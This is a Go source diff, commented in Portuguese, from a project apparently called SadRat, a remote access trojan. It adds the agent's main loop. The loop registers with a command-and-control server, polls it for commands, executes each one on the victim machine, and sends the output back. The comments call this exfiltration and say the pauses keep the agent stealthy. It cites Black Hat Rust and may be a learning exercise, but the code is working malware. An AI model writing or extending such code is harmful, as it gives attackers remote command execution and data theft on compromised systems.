@@ -6,6 +6,7 @@ import (
 	"errors"
 	"net/http"
 	"os/exec"
+	"log"
 	"time"
 	"github.com/VitorDie/SadRat/internal/dto"
 )
@@ -154,4 +155,53 @@ func (a *AgentHTTP) SendJobResult(jobID string, output string) error {
 	}
 
 	return nil
+}
+
+func (a *AgentHTTP) Run() error {
+	log.Println("[AGENT] Iniciando processo de infecção...")
+
+	// 1. REGISTRO
+	agentID, err := a.RequestAnUUIDToMe()
+	if err != nil {
+		log.Printf("[AGENT] Falha fatal ao registrar no C&C: %v\n", err)
+		return err
+	}
+	log.Printf("[AGENT] Registrado com sucesso! UUID: %s\n", agentID)
+
+	// 2. LONG POLLING (Loop Infinito)
+	// Como no livro Black Hat Rust, criamos um loop infinito com pausas 
+	// para não consumir 100% da CPU da máquina vítima.
+	for {
+		// A. Pede ordens ao C&C
+		job, err := a.RequestJob(agentID)
+		if err != nil {
+			// Se der erro de rede, apenas dorme e tenta de novo depois
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		// Se o ID do Job for vazio, significa que o C&C disse: "Não tem comandos"
+		if job.ID == "" {
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		log.Printf("[AGENT] Comando recebido: %s\n", job.Command)
+
+		// B. Executa a ordem letal
+		output, err := a.ExecuteJob(job)
+		if err != nil {
+			// Se o comando falhar no SO alvo, o output será a mensagem de erro
+			output = err.Error() 
+		}
+
+		// C. Devolve o resultado (Exfiltração)
+		err = a.SendJobResult(job.ID, output)
+		if err != nil {
+			log.Printf("[AGENT] Falha ao enviar resultado para o C&C: %v\n", err)
+		}
+
+		// Pausa antes do próximo ciclo para ser furtivo
+		time.Sleep(1 * time.Second)
+	}
 }
